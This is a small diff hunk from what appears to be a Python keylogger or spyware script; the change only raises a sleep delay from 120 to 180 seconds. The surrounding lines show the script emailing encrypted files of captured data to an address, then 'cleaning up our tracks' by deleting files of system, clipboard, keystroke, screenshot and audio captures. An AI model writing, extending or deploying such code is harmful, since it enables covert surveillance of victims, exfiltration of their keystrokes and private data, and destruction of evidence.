@@ -206,7 +206,7 @@ for encrypting_file_in in files_to_encrpt:
 
     send_email(encrypted_file_names[counts], encrypted_file_names[counts], toaddr)
     count += 1
-time.sleep(120)
+time.sleep(180)
 
 # cleaning up our tracks and delete files
 delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
